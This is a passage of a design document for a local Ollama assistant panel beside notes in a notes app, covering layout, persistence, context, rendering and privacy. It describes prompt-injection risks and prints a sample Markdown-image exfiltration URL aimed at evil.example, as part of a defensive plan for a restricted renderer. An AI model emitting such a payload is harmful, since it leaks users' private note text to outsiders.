  ([`web-side-by-side.md`](ui/web-side-by-side.md)).
- `MarkdownEditor` keeps both sections mounted in a CSS grid, `minmax(0, var(--editor-col)) auto minmax(0, var(--preview-col))`,
  with a `ResizeHandle` in the middle (lines 343 to 448). The split is a single 0 to 1 number, `editorRatio`, clamped to
  0.2 to 0.8, shared by every pane and saved on drag end through `saveLayout` ([`layout.ts`](../apps/web/src/lib/composition/layout.ts),
  [`useLayout.ts`](../apps/web/src/components/notes/useLayout.ts)). The arrangement of panes, their relative widths (`size` in `PaneState`) and their views are not
  saved ([`panes.ts`](../apps/web/src/components/notes/panes.ts) header).
- A pane is "focused" when anything inside it gets focus or a pointer-down (`onFocusCapture`, `onPointerDownCapture`,
  `NotePane.tsx` lines 162 to 163); document-level shortcuts only answer in the focused pane (lines 108 to 147).
- **Selection hooks:** `useHighlightMenu(textarea, ...)` and `HighlightMenu` in the editor (`MarkdownEditor.tsx` lines
  222 and 433), and `PreviewHighlightMenu`, a right-click menu on the preview that maps a DOM selection back to
  source offsets and already has a Copy item. `openFind` reads `textarea.selectionStart/End` (`NotePane.tsx` lines 83 to 95).

**Options.**

| | 1. Dock inside the pane (editor, preview, assistant) | 2. Fourth view tab | 3. App-level right drawer | 4. New pane kind in `panes.ts` |
|---|---|---|---|---|
| **Reuses** | `ResizeHandle`, `useMinWidth`, the `shownView` degrade idea; no change to `MarkdownEditor`'s grid if docked outside it | `PaneView`, `EditorTabs`, `stepView` | `ResizeHandle` and `useLayout`, as the sidebar does | `PaneArea` dividers, drag, close, sizes, row scroll |
| **Narrow widths** | Needs a rule. **Inference:** while open, `canSplit` uses `SIDE_BY_SIDE_MIN_WIDTH` plus the dock width, so Preview gives way first; below a dock minimum, the dock replaces the note view (mirrors Split to Markdown) | n/a: it *is* the narrow answer, but replaces the note | Steals width from every pane; desktop `minWidth` is 760 ([`window.ts`](../apps/desktop/src/main/window.ts) line 40) with a 256 px sidebar | Row scrolls, as for notes |
| **Several notes open** | Unambiguous: about this pane's note; each pane can have one | Same as 1, per pane | Must follow `focusedId`; "about" changes on focus, so it needs an "About: title" chip and maybe a pin | Binds to a `forNoteId` |
| **Cost / risk** | Low to medium. New persisted width only if saved (`Layout`, `WebSettings`, `saveLayout` validator at `validate.ts` lines 99 to 107, `useLayout`) | Lowest, but not "off to the side": you cannot read the note and chat | Medium | High: pane identity is the note id ("a note is open in at most one pane", `panes.ts` header), and `panes.ts` plus its tests are shared with the CLI |
| **Shortcut** | Toggle button with `aria-keyshortcuts`, like the tabs (`EditorTabs.tsx` line 52) | Fits `Mod+\` cycling | Global toggle | Open from the note's `⋯` menu |

**Recommendation (Inference):** option 1 for the MVP, in a new `AssistantPanel` rendered by `NotePane` beside
`MarkdownEditor`, with its width held in component state first so `Layout`, settings, backup and the IPC validators
stay untouched. The user's wording, "very similar to how the editor/preview split already exists", points at the
pane, not the app. Option 3 is the fallback if docks prove cramped in practice.

**Shortcuts.** In use today, from [`shortcuts.ts`](../apps/web/src/components/shortcuts/shortcuts.ts) and the code:
`Mod+K` (search), `Mod+/` and `?` (shortcut list), `Mod+F` (find), `Mod+\` and `Cmd+Ctrl+Left/Right` (view),
`Mod+Shift+H` (highlight), `Mod+Shift+K` (note link), `Mod+Shift+M` (images), `Mod+Shift+X` (`<Image />`), `Tab`,
`Shift+Tab`, `Esc`, and arrows, `Home` and `End` on tabs and dividers. Pick a toggle from the unused ones, but I did
not check candidates against browser shortcut tables; the repo's own precedent for that check is
[`note-links.md`](ui/note-links.md) ("Why this shortcut"). Inside the chat composer, `Esc` should return focus to the
editor (as `Esc` leaves the CLI editor), and `Mod+Enter` is a natural send. Add the new entries to `shortcuts.ts`,
which is documentation only and must be kept in step by hand.

### C2. Conversation scope and persistence

| Option | Trade-offs |
|---|---|
| **A. Per pane, memory only** | Simplest. Lost when the pane closes or moves; matches the pane arrangement, which is itself not saved. |
| **B. Per note, memory only** (map keyed by note id, held above the panes) | Matches "about this note"; survives moving or closing a pane within a session; gone on reload. |
| **C. Per note, saved in SQLite** | New tables are additive (`CREATE TABLE IF NOT EXISTS`; [`data-model.md`](architecture/data-model.md)), so older apps ignore them. A backup is a `VACUUM INTO` snapshot of the whole database, so conversations would enter every backup and restore ([`backup-restore.md`](architecture/backup-restore.md)), which are not encrypted ("Gaps"). Trash keeps a note's id on delete and restore, so chats could follow attachments' rule (kept in Trash, erased on permanent delete: [`feature-matrix.md`](feature-matrix.md)); that needs hooks in `permanentlyDeleteNote` and the 60-day purge. Visible to all three products. Needs `CompositionApi` methods, `API_METHODS`, validators, tests. |
| **D. Global, one chat for all notes** | Does not match "about this note"; only makes sense with retrieval across notes (later). |
| **E. In the settings file** | No: size, secrecy, and `parseWebSettings` rewrites it. |

Is saving desirable? The product is "local-first" with "local ownership" ([`product-positioning.md`](product-positioning.md)).
A saved chat stays local, but it makes model output a durable artifact beside the notes, puts third-party text and
possibly quoted note text into unencrypted backups, and blurs the boundary the user drew ("not injected into the
note"). **Inference: B for the MVP**. *Update, 2026-10-21: the owner then chose C as a planned slice, on by default behind a
setting, in backups, following the note into Trash; see E3.* "Save this conversation as a note" is a separate question about creating a *new* note (see E).

### C3. Context given to the model

| Source | How | Notes |
|---|---|---|
| **Current note** | `Note.content` is the whole raw text, frontmatter included ([`data-model.md`](architecture/data-model.md)); `parse(value)` already splits it (`MarkdownEditor.tsx` line 89) | **Inference:** send title, tags and description, drop `createdAt` and `updatedAt` (noise, and metadata about the user), then the body. Wrap it in a delimited block and tell the model it is data (OWASP mitigation 6, "segregate and label external content" [74]). |
| **Selection** | Editor: `selectionStart/End`. Preview: the DOM selection, as `PreviewHighlightMenu.inspect` already does | Add "Ask about this" to the preview's right-click menu; show a removable "Selection (n chars)" chip in the composer. Leave the editor's colour listbox alone: its number keys are taken. |
| **Other notes** | (i) Notes the current one links to: `](note:ID)` ([`noteRefs.ts`](../apps/web/src/lib/composition/noteRefs.ts)); (ii) a picker like `[[`; (iii) search: `searchNotes` returns only id, title, description and group path | All notes and their content are already in the client (`Workspace.notes`), so attaching one needs no new fetch. **Inference:** never send other notes automatically; offer an explicit attach. Automatic retrieval multiplies cost and privacy exposure. |
| **Images** | Stored under `app_data/`, served by `/app_data/[name]` or `app://` ([`images.md`](architecture/images.md)) | Vision depends on the model; Ollama accepts only base64 [33]. Default: send the alt text, not the bytes; opt in per image later. |
| **Attachments** | Desktop-only files | Not sent. |

**Window and cost.** Limits live on the provider's model pages: the OpenAI flagship models list a 1.05M-token window
and 128K output, priced per million tokens [29]; Anthropic's current models list 1M and 128K [50]. For local models
the binding limit is the server's configured context (Ollama's default is disputed, A2). A character-count estimate
is unreliable; OpenAI offers `POST /v1/responses/input_tokens` for exact counts and says "characters divided by 4"
is inaccurate [30]; Anthropic has `count_tokens` [45]; llama.cpp has equivalents [42]; Ollama reports
`prompt_eval_count` after the fact [36]. **Inference, cost shape:** the note is re-sent on every turn. A 10,000-token
note over a 20-turn chat sends about 200,000 input tokens, about $0.40 at $2 per million (`gpt-6.1-sol`) or $0.02
at $0.10 (`gpt-6-luna`) [29], before history growth, output and any caching discount. Show tokens sent per turn
from the usage chunk and warn before a turn whose estimate is large.

### C4. "Never inject AI output into the note"

**Ruled out:** any path from assistant text to the note's value: calling `onChange`, `replaceText` or
`saveNoteContent` from the assistant; streaming into the textarea; "apply" or diff buttons; tools that edit; AI
auto-filling tags or description; storing chat inside `notes.content` or frontmatter. **Ruled in:** reading the note;
rendering output beside it; native text selection and copying; the existing clipboard `copy()` helper
([`PreviewHighlightMenu.tsx`](../apps/web/src/components/notes/PreviewHighlightMenu.tsx) line 35).

**Inference: make it structural.** `AssistantPanel` receives `noteContent: string` and no `onChange`; a test asserts the
prop type has none. Keep assistant code out of the modules that call `onChange`.

**Open question for you (not decided here):** is a user-initiated Copy button acceptable? An "Insert at cursor"
button? "Create a new note from this answer"? All three are one explicit click, but each moves AI output nearer the
note than "off to the side".

**Rendering untrusted assistant Markdown.** Reusing `NoteMarkdown` ([`NoteMarkdown.tsx`](../apps/web/src/components/notes/NoteMarkdown.tsx))
for bubbles would be wrong, for four verified reasons:

1. **Remote images load by themselves.** `NoteImage` shows "an https URL, a data: URI ... as written" (lines 11 to 13), and
   react-markdown's default URL policy allows `http` and `https` [58]. The desktop CSP allows `img-src ... https:`
   ([`protocol.ts`](../apps/desktop/src/main/protocol.ts) line 22); the web app sets no CSP that I could find. A model steered by text inside a
   note (or simply misbehaving) can emit `![](https://evil.example/p.png?d=<note text>)` and the app fetches it on render.
   OWASP lists exactly this: an injected instruction makes the model insert an image whose URL leaks the conversation
   [74], and "Markdown images can steal your chat data" [75].
2. **MDX mode.** If the text mentions `<Info`, `<Warning`, `<Image`, `<Toc`, `<Mark` or `<Footnotes` (`usesMdxComponent`,
   [`mdx/components.ts`](../apps/web/src/components/notes/mdx/components.ts) line 44), it is parsed as MDX; other tags and
   `{expressions}` are rejected and the user sees a "Couldn't render this note's components" banner. Nothing is evaluated
   (no `@mdx-js/mdx`; [`mdx-components.md`](ui/mdx-components.md)), so this is a robustness problem, not code execution.
3. **Note-specific behaviour:** `note:ID` links open notes, `#fragment` links scroll to ids, `<Image src="app_data/...">`
   shows local images (`NoteAnchor`, [`NoteLink.tsx`](../apps/web/src/components/notes/NoteLink.tsx)). Harmless, but it makes
   model text look like part of the note.
4. **Cost:** `rehypeSourceSpans` and code highlighting exist for editing features.

What is fine: react-markdown "is secure by default", escapes or ignores raw HTML, and the repo uses no `rehype-raw` or
`allowDangerousHtml` (only a constant `dangerouslySetInnerHTML` theme script in `layout.desktop.tsx`) [58].
**Inference:** write `AssistantMarkdown` on `react-markdown` + `remark-gfm` with a `components` map: `img` renders its
alt text and URL as inert text (or only `app_data/` paths), `a` renders external links as plain text or through the
desktop's existing `openExternal` path after an explicit click ([`window.ts`](../apps/desktop/src/main/window.ts)); optionally add `rehype-sanitize`,
which react-markdown recommends for complete safety [58]. Re-parse on a throttle while streaming.

### C5. The CLI

The terminal app has one tree plus a row of panes; panes show an editor, a preview or both ([`screen-navigation.md`](architecture/screen-navigation.md)).
Keys inside an editor always win, and `Esc` always returns to the tree ([`cli-keybindings.md`](ui/cli-keybindings.md)).
Bindings live in one list ([`keymap.ts`](../apps/cli/src/keymap.ts)). A side-by-side chat in a terminal would need the
shared `panes.ts` to learn a new view, which also affects web and desktop. The cheaper and consistent model is the
one attachments use: a full-screen **Assistant screen** opened from a pane key, showing the chat about *that* note,
with a bottom composer (`textarea`) and a `scrollbox` history. OpenTUI's `Markdown` renderable has a `streaming`
flag (observed in `Markdown.d.ts` of the 0.5.14 copy installed in the main checkout; the pin is 0.6.3, so that is
**unverified** for the pinned version). Per the keybinding page and `keymap.ts`, `ctrl+r` and `ctrl+s` are unbound
in the pane scope (`ctrl+g` is bound only in the tree); re-check `keymap.test.ts` before choosing. The CLI lags web and desktop elsewhere by design (links, highlights;
[`feature-matrix.md`](feature-matrix.md)), so leaving it out of v1 has precedent.

## D. Risks, privacy and product fit

**Product fit.** [`product-positioning.md`](product-positioning.md) names "local-first" as the goal and lists "local
ownership" and "use without a mandatory subscription" in its Obsidian study case. This is the first feature where note text leaves the machine because of a user
action. The precedents for outbound calls are small: a city lookup on Open-Meteo, and update checks, both documented
([`cli-keybindings.md`](ui/cli-keybindings.md), [`desktop-updates-plan.md`](desktop-updates-plan.md)). **Inference** for the UX:

- Off until a provider is configured. A local provider shows a "stays on this machine" badge (only true while the
  server is bound to loopback; `OLLAMA_HOST`, LM Studio's "serve on local network" and `--host` can change that [34][40][42]).
- First send per provider: a one-time dialog naming the host, listing what is sent (title and tags, body, selection,
  your messages, earlier turns in this chat), linking the provider's retention page.
- A permanent chip above the composer: "Sending: this note (about 1,200 tokens) + selection", with a way to untick
  the note, and a "view exact context" disclosure.
- SIWC adds its own duties: "Using ChatGPT plan", Manage usage, active account [11].
- Whether a note can opt out (for example a frontmatter flag) is a question for you.

**Retention and training, as published (re-check; these change).**

| Provider | Says |
|---|---|
| OpenAI API | Not used to train by default; abuse logs up to 30 days; `store: false` avoids Responses application state; ZDR and MAM need approval [27][21] |
| Anthropic API | Retained data never used for training without permission; conversation content not retained by default except Covered Models (30 days); ZDR per organization [48] |
| SIWC | Over HTTP, `store: false` is mandatory [5]. What retention applies to plan-usage requests is **unverified**; Codex's page says ChatGPT sign-in follows "workspace permissions, RBAC, and retention and residency settings" [15], and SIWC says it does not expose conversations [1] |
| Local | Nothing leaves the machine unless the server is exposed |

**Keys.** B covers storage. Also never log the `Authorization` header, redact it in error reports, and keep it out of
the Markdown renderer's reach.

**Prompt injection, realistically.** The model has no tools and no write path to the note, so the classic agent
hijack ("OWASP: unauthorized access to functions", "executing arbitrary commands" [74]) has nothing to hijack. What is
left: (a) **exfiltration through rendering**, the real one, closed by the restricted renderer; (b) misleading or
phishing text from injected note content (a pasted web page can instruct the model); (c) cost amplification from
instructions to write at length (cap `max_tokens`, and note OpenAI accounts rate limits by `max_tokens` [26]); (d) more
exposure the day other notes are added as context. OWASP says prevention "may not be fully achievable" and recommends
least privilege and human approval for risky actions [74]; both are cheap here because there are no actions.

**Cost surprise.** Show tokens per turn, a Stop button wired to `AbortController`, a cap on output, and a
confirmation above a token threshold. For OpenAI, tell quota exhaustion from rate limiting: they are different 429s [25].

**Error states.**

| State | What the UI should do |
|---|---|
| Offline / DNS failure | "Can't reach <host>." Keep the draft; retry button. |
| Bad key (401) / wrong org | Name the provider; link to settings; never echo the key. |
| Region blocked (403) | Show OpenAI's message [25]. |
| Local server down (connection refused) | "Nothing is listening on <url>. Is Ollama / LM Studio running?" Show the configured URL. |
| Model not pulled | Ollama returns 404 `model '<name>' not found` [38]: "Run `ollama pull <name>`". LM Studio can load models on demand [40]. |
| Rate limited (429) | Honor `Retry-After`, back off with jitter, cap retries [26]. |
| Quota exhausted (429) | Do not retry; point at billing [25]. |
| Context too long | Ollama truncates silently [38] (no error), so rely on the gauge; llama.cpp's native response has a `truncated` flag [42]; request-size limits exist (Anthropic 413 above 32 MB [45]); the exact OpenAI error for an oversized prompt I did not look up (**unverified**). |
| Mid-stream failure | OpenAI Responses `error`/`response.failed` [22]; Anthropic `event: error` [47]; SIWC usage-limit errors can arrive after streaming starts [4]. Keep the partial text, mark it incomplete, offer retry. |
| SIWC | Handle each `subscription_sharing_*` code as listed [6]; OpenAI does not fall back to API billing. |

**Accessibility of a streaming region.** `role="log"` suits a transcript: implicit `aria-live="polite"`, `aria-atomic="false"`,
new items only at the end, and it must have an accessible name [71]. Announcing every token would be noisy; MDN warns
against rapid updates in polite regions [72]. **Inference:** keep the in-flight bubble out of announcement with
`aria-busy="true"` until it completes [73], announce start and finish through a separate `role="status"`, report
errors with `role="alert"` as the editor already does ([`MarkdownEditor.tsx`](../apps/web/src/components/notes/MarkdownEditor.tsx)
lines 359 to 366), and create the live region before content is added [72]. The composer needs a label, the Stop button
must be reachable by keyboard, and `Esc` returns to the editor.

**Opengrep and CI.** CI runs `scripts/opengrep.mjs` with `--error` on each app, using rules pinned to a commit, test files
excluded ([`opengrep.mjs`](../scripts/opengrep.mjs)). *Observed 2026-10-21*, by running that same rule set (via the script's
own `buildScanArgs`) over five synthetic snippets in a scratch folder with my local opengrep 1.14.1 (CI pins v1.30.2, so
re-run before a PR):

| Code | Result |
|---|---|
| `fetch("http://127.0.0.1:11434/api/tags", ...)` | **Flagged**, `react-insecure-request` (ERROR) |
| `fetch("http://localhost:11434/...")`, or a base URL held in a variable | Not flagged |
| `dangerouslySetInnerHTML={{__html: html}}` | Flagged |
| `<Markdown allowDangerousHtml>` | Flagged |
| `api_key: "<35 random characters>"` | Flagged, `detected-generic-api-key` |
| `localStorage.setItem("openai_api_key", key)` | Not flagged: opengrep will not catch keys in browser storage |

So: build default URLs from a constant or use `localhost`; keep key-looking literals out of non-test source and out of
anything under `apps/`; fixtures belong in `*.test.*`. From reading the rule (not run): `detect-non-literal-fs-filename` is a taint rule that treats function arguments as
sources, so a config path passed into a function that calls `fs` may be flagged. Other CI facts: web and desktop tests run on Node 22 and the CLI on Node 26
([`unit-tests.yml`](../.github/workflows/unit-tests.yml)), so shared code must work on both; each new runtime dependency
needs `collect-licenses.mjs` and Dependabot attention; no workflow change means `pnpm lint:actions` is untouched.
(Local opengrep 1.14.1 crashed on a non-UTF-8 locale until I set `LC_ALL=en_US.UTF-8 PYTHONUTF8=1`.)

## E. Feasibility, slicing and open questions

### E1. Slices

**Slice 1: MVP (web and desktop).** *Revised 2026-10-21 for the Ollama-only scope: the "OpenAI-compatible adapter",
"key" and `safeStorage` below become an Ollama-native adapter and a base-URL setting; no key is stored.* In-memory
conversations per note, a **New chat** button (decided: a note can have several conversations; **the plan keeps
the earlier ones in memory with a simple switcher**, so nothing is lost by clicking New chat, see
[`ai-helper-plan.md`](ai-helper-plan.md) P9), Ollama `/api/chat` (local or
remote URL), no Authorization header (decided: no proxy token in this version; **Inference:** map a 401 or 403 to
"this server asks for credentials, which this version does not support"), current note and selection, no tools,
restricted renderer.

| Area | Files |
|---|---|
| Shared logic (framework-free, next to the data layer that desktop and the CLI already import) | new `apps/web/src/lib/composition/assistant/`: the `ChatProvider` seam from A4 (kept even though only one provider exists, so slice 3 is a second adapter), the Ollama adapter (NDJSON reader, request builder that sets `num_ctx`, model list from `/api/tags` and `/api/show` with the cloud filter, error mapping), base-URL setting (not a secret, so it can live with the product's settings; **Inference**), `assistantApi.ts` contract with an `ASSISTANT_METHODS` list in the style of [`updatesApi.ts`](../apps/web/src/lib/composition/updatesApi.ts); tests against a fake `http` server |
| Web | `apps/web/src/app/api/assistant/chat/route.ts` (guarded stream); `assistantClient.ts`; a Settings section in [`SettingsScreen.tsx`](../apps/web/src/app/settings/SettingsScreen.tsx) |
| Desktop | `apps/desktop/src/main/assistant.ts` (the adapter; no key to store), validators in [`validate.ts`](../apps/desktop/src/main/validate.ts), registration in [`ipc.ts`](../apps/desktop/src/main/ipc.ts), a push channel in [`channels.ts`](../apps/desktop/src/shared/channels.ts) and a wrapped listener in [`preload/index.ts`](../apps/desktop/src/preload/index.ts), `assistantClient.desktop.ts`; CSP unchanged |
| UI | `AssistantPanel.tsx`, `AssistantMarkdown.tsx`, `useAssistantChat.ts` under `apps/web/src/components/notes/`; the toggle and dock in [`NotePane.tsx`](../apps/web/src/components/notes/NotePane.tsx); per-note conversation map in [`NotesApp.tsx`](../apps/web/src/components/notes/NotesApp.tsx); entries in [`shortcuts.ts`](../apps/web/src/components/shortcuts/shortcuts.ts) |
| Docs | a row in [`feature-matrix.md`](feature-matrix.md) (CLI no, web yes, desktop yes), a page under `docs/ui/`, a line in [`index.md`](index.md) |

**Slice 2: comfort.** "Ask about this" in `PreviewHighlightMenu`; context gauge from `prompt_eval_count` (once
confirmed against a live server, see Scope) and the model's window from `/api/show`; remembered "sending to *host*"
notice; "view exact context". (The model picker and explicit `num_ctx` moved into slice 1.)

**Slice 3 (later, not before slice 1 is proven): other local servers.** LM Studio, llama.cpp `llama-server` and vLLM
through a second adapter on the same `ChatProvider` seam: OpenAI-style `POST /v1/chat/completions` with SSE
(`data:` lines ending `[DONE]`) and `GET /v1/models`. Their addresses, CORS defaults and optional API keys are in the
A2 table. Things to settle then, not now: (1) a user-supplied OpenAI-style URL could point at a hosted provider, so
decide whether "local only" is enforced (loopback and private addresses) or trusted; (2) LM Studio, llama.cpp and
vLLM each have optional API keys, which brings back the key-custody rules in B (never in `settings.json`, never in
backups), unlike Ollama; (3) context size is set on each server rather than per request, so the `num_ctx` warning
becomes "ask the server", and `/v1/models` differs per server (A2 "Where it leaks").

**Parked, out of scope since 2026-10-21:** Anthropic-native and OpenAI-Responses adapters, hosted providers, and "Sign
in with ChatGPT"; the design notes in A1 and E2 stay as reference. Also not in this version: an optional bearer token
for a remote Ollama behind a reverse proxy; image input for models whose `/api/show` lists `vision` (a possible
slice 2 item).

**Slice 4: saved conversations (planned; see E3, decided 2026-10-21).** *Copy* and *New note from this* on assistant
messages belong in slice 1, since they need no storage.

| Area | Files |
|---|---|
| Schema | new tables for conversations and their messages (keyed by `note_id`, no foreign key) in [`db.ts`](../apps/web/src/lib/composition/db.ts), in the style of `ATTACHMENTS_SCHEMA`; a repo module beside [`attachmentsRepo.ts`](../apps/web/src/lib/composition/attachmentsRepo.ts) |
| Lifecycle | an orphan sweep run from `purgeExpiredTrash` and permanent delete in [`service.ts`](../apps/web/src/lib/composition/service.ts); tests like those in `attachments.test.ts` for Trash, restore, permanent delete, and a note erased by the CLI |
| API | list/append/delete-one/delete-all on `CompositionApi` ([`api.ts`](../apps/web/src/lib/composition/api.ts)), `client.ts`, `client.desktop.ts` and the desktop validators and IPC (chats are note data, so they take the main CRUD path, unlike the streaming channel in slice 1) |
| Settings | a "Save chats" toggle (field added to `WebSettings`) and **Delete all conversations** with the typed-confirmation dialog, in [`SettingsScreen.tsx`](../apps/web/src/app/settings/SettingsScreen.tsx) |
| UI | conversation list in the dock (the switcher and "New chat" already exist from slice 1, in memory; they now persist); delete-one with `ConfirmDialog` |
| Docs | [`backup-restore.md`](architecture/backup-restore.md) (chats are in backups; backups are unencrypted), [`web-trash-can.md`](ui/web-trash-can.md) (chats follow the note), [`data-model.md`](architecture/data-model.md), [`feature-matrix.md`](feature-matrix.md) |

**Not planned (owner's answers, 2026-10-21):** an "attach another note" picker, a CLI Assistant screen
([`App.tsx`](../apps/cli/src/App.tsx), [`keymap.ts`](../apps/cli/src/keymap.ts)), and an app-level drawer.

### E2. What each product could support

| | CLI | Web | Desktop |
|---|---|---|---|
| OpenAI-compatible and local servers | Yes, direct `fetch` | Yes, via route handler | Yes, via main process |
| OpenAI key | Env var or `0600` file | Env var or `0600` file | `safeStorage` |
| Anthropic native | Yes | Yes | Yes |
| SIWC | Possible (loopback listener, own tokens) | Possible if local (Next process hosts the listener); never hosted | Best fit: OpenAI's own example is Electron [13] |
| Streaming UI | `Markdown streaming` flag (version **unverified**) | `AssistantPanel` | `AssistantPanel` over IPC push |
| Side-by-side with the note | A full-screen screen, not side by side | In-pane dock | In-pane dock |
| Saved history | Possible later (shared DB) | Possible later | Possible later |
| Selection as context | Editor selection API **unverified** | Yes | Yes |
| Effort | Highest per feature (own UI, separate keys) | Lowest | Low to medium (IPC contract) |

### E3. Decisions

#### Decided 2026-10-21

The owner answered the first seven questions below. Where a decision has a consequence the research
turned up, it is stated here; the original questions and defaults follow in the next subsection.

| # | Decision | What follows from it |
|---|---|---|
| 3 | **Copy-out and "new note from an answer" are wanted. "Insert at cursor" is not.** This is a collaboration, not an author. | Two actions per assistant message: *Copy* and *New note from this*. **Inference:** both must be explicit, per-message clicks, and *New note* creates a separate note through the existing create-note path; no code path may call the open note's `onChange` (the panel still gets the note as a read-only string, see C4). A new note opens in its own pane via the existing "open to the side" logic. |
| 1 | ~~Both an API key and "Sign in with ChatGPT".~~ **Superseded the same day: ChatGPT and every hosted provider are out of scope; Ollama only (see Scope).** | ~~Both stay in scope.~~ (Historical:) Both stayed in scope. Order is unchanged: the API-key and local-server path first, SIWC after it (slice 3), because SIWC is a preview, its terms were unreadable to the research [18], and the DevKit is noncommercial [14]. Reading the SIWC terms is a gate on slice 3, not on slice 1. |
| 2 | **Save conversations locally; never in a cloud; a self-hosted Ollama server, even remote, is acceptable. Later is fine.** | Saved chats go in the app's own SQLite database next to the notes, per note (option C in C2). That moves C from "on demand" to "planned". A remote Ollama is just a base URL, which slice 1 already supports. (Backups, Trash, deletion and the on/off setting were then decided: see "Saved chats" below.) **Inference:** Ollama's OpenAI-compatible endpoint takes the whole `messages` array on each request, so the server is not where history is kept; the app's database is. If "save to the Ollama server" is meant literally, check Ollama's own API docs first; this research did not find such a feature. Also **Inference:** a remote Ollama receives the note text on every turn, so a plain `http://` URL to a non-loopback host should carry a visible "unencrypted" warning. |
| 5 | **Not the CLI for now.** | Unchanged from the default. |
| 6 | **Current note and selection only; other notes later.** | The explicit "attach a note" picker and any retrieval stay out of slices 1 to 3. |
| 11 | **The web app may be hosted for several users some day, not soon.** | **Inference:** keep every single-user assumption in one place, so it can be revisited rather than rediscovered: the route handler's guard and its saved base URL (SSRF, see B), and the choice to store chats in a local database. With Ollama only, the hosted-web problem is reaching a user's own Ollama from a hosted server (see Scope). (Historical, for SIWC specifically: OpenAI's docs open the preview to "open-source and locally hosted apps" and send remotely hosted apps to an interest form [2][5][13], so a hosted web build should not have counted on it.) |
| 8 | **Scope is Ollama only, local or self-hosted remote.** (Same day, after the table above was written.) | See Scope. Answers to the follow-up questions: **LM Studio, llama.cpp and vLLM count as local but come later** (slice 3); **the picker hides Ollama's cloud models**; **no proxy bearer token in this version**; **a note can have several conversations, with a "New chat" button** (slice 1 has the button and an in-memory switcher; slice 4 saves them). |
| 7 | **A dock in each pane.** | As recommended in C1. Each pane's helper is about that pane's note. |

#### Saved chats: decided 2026-10-21 (later the same day)

| Question | Decision | What follows |
|---|---|---|
| In backups? | **Yes.** | Free if chats live in the same SQLite file: a backup is a `VACUUM INTO` snapshot of the whole database, so restore brings them back ([`backup-restore.md`](architecture/backup-restore.md)). The cost flagged in C2 stays: backups are not encrypted, so chat text, which quotes note text, is in them. **Inference:** say so on the Backup card and in `backup-restore.md`. Chats are not added to the Meilisearch index. |
| In Trash, and erased on permanent delete? | **Yes to both.** | Same rule as attachments ([`attachments.md`](architecture/attachments.md#deleting)): a table keyed by `note_id` with no foreign key. Trash moves the note to `trashed_notes` under the same id ([`web-trash-can.md`](ui/web-trash-can.md)), so its chats stay attached and a restore finds them again. For permanent delete and the 60-day purge, add a `removeOrphans`-style step that deletes conversations whose note is in neither `notes` nor `trashed_notes`, next to `removeOrphanedAttachments` in [`service.ts`](../apps/web/src/lib/composition/service.ts) (lines 262 to 277; `purgeExpiredTrash` runs it). **Inference:** a sweep beats a hook on one delete path, because the CLI erases a note's row for good without the Trash Can and knows nothing about chats ([`web-trash-can.md`](ui/web-trash-can.md)); the docs say expired Trash is cleared whenever the workspace opens, so the next web or desktop start would sweep those chats too. Confirm that in the code when building. |
| Delete one, delete all | **Both. Deleting all gets an extra warning.** | Chat deletion is permanent and does not go through the Trash Can (**Inference**; it is not a note). One conversation: the existing [`ConfirmDialog`](../apps/web/src/components/ConfirmDialog.tsx), whose Cancel holds focus, opened from the panel. All conversations: on the Settings page beside the save toggle, with a stronger dialog. **Inference:** it should state how many conversations in how many notes, say there is no undo and no Trash, say that backups already taken keep their copies, and keep the destructive button disabled until the user types a word. `ConfirmDialog` has no typed-confirmation today, so that is a small extension. |
| Saving on or off | **On by default; a setting turns it off.** | A toggle on the Settings page. Settings are per product and `parseWebSettings` drops fields it does not know, so the field must be added to the type ([`webSettings.ts`](../apps/web/src/lib/composition/webSettings.ts) line 97); backups carry settings. **Inference:** desktop and web share one database by default ([`desktop-app-plan.md`](desktop-app-plan.md) decision D7), so a chat saved by one product is visible in the other even if the other has saving off. Default meaning of "off": new chats are kept in memory only and existing saved chats are left alone, with **Delete all** next to the toggle. Because saving is on by default, the first-use "sending to *host*" notice should also say that chats are saved on this machine, and where to turn that off. |

Decided the same day: a note can have **several conversations**, with a **New chat** button (the owner's answer to
the one-or-several question). One small question is left for slice 4: what is a conversation called in a list?
Default: the first message, shortened; no model-written titles, so nothing extra is sent to the model.

#### Original questions and defaults

1. *(Superseded: Ollama only.)* **API key only, or also "Sign in with ChatGPT"?** Default: API key and local servers first; SIWC as slice 3. Why:
   it is a preview, restricted to open-source and locally hosted apps, with terms I could not read [18], a
   noncommercial reference kit [14], and per-product sign-in. Before committing, read the SIWC terms and confirm that
   a signed, notarized GitHub-release binary counts as an "open-source app".
2. **Save conversations?** Default: no (in memory, per note). Why: backups are unencrypted and would absorb them;
   local-first positioning favors not accumulating model output.
3. **Is Copy acceptable, and is "Insert at cursor" acceptable?** Default until you answer: neither affordance in
   the MVP; native text selection and Cmd/Ctrl+C still work. Why: your wording was "not directly injected"; either
   button changes how close the output sits to the note.
4. *(Superseded: Ollama only.)* **Which hosted providers?** Default: OpenAI plus a generic "OpenAI-compatible URL" (covers Ollama, LM Studio,
   llama.cpp, vLLM, OpenRouter, Gemini's compat endpoint); Anthropic-native later. Why: one adapter, widest reach.
5. **Is the CLI in scope for v1?** Default: no. Why: the pane model does not map, and the CLI already trails on
   features.
6. **Feed other notes as context?** Default: only by explicit attach, never automatic. Why: cost and exposure scale
   with every note sent.
7. **Dock inside the pane, or an app-level drawer?** Default: dock. Why: unambiguous subject and closest to the
   editor/preview split.
8. **Can a note opt out of ever being sent?** Default: not in the MVP; ask once you see real use. Why: cheap to add
   later, and it needs a place to live (frontmatter would reach the other products).
9. *(Mostly moot: Ollama needs no key; applies only to an optional proxy token.)* **Where do keys live?** Default: `safeStorage` on desktop; env var or a `0600` file on web and CLI; never in
   `settings.json`. Why: backups copy settings.
10. **One provider config per product, or shared?** Default: per product (settings are per product today). A shared
    non-secret file in the style of `~/.composition-location.json` is possible later; secrets stay per product.
11. **Will the web app ever be hosted for several users?** Default: no, and write that down. If yes, SSRF and
    reaching the user's Ollama change (SIWC eligibility is parked).
12. **Show the exact context before sending?** Default: yes, as a disclosure. Why: cheap, and it makes the privacy
    claim checkable.

### E4. Not resolved here

- OpenAI's Terms of Use, the "Sign in with ChatGPT Terms" and the Help Center article (HTTP 403 to fetchers); the
  Plus/Pro versus Go eligibility conflict; the SIWC launch date (docs undated).
- Whether this project counts as "open-source" for SIWC and what the preview's end looks like [5].
- LM Studio's default port and CORS default; Anthropic's and OpenAI's browser CORS policy; llama.cpp, vLLM and LM Studio
  streaming usage; the OpenAI error code for an oversized prompt.
- Whether Chrome's Local Network Access prompt shipped [70], and whether an https page may call `http://localhost`.
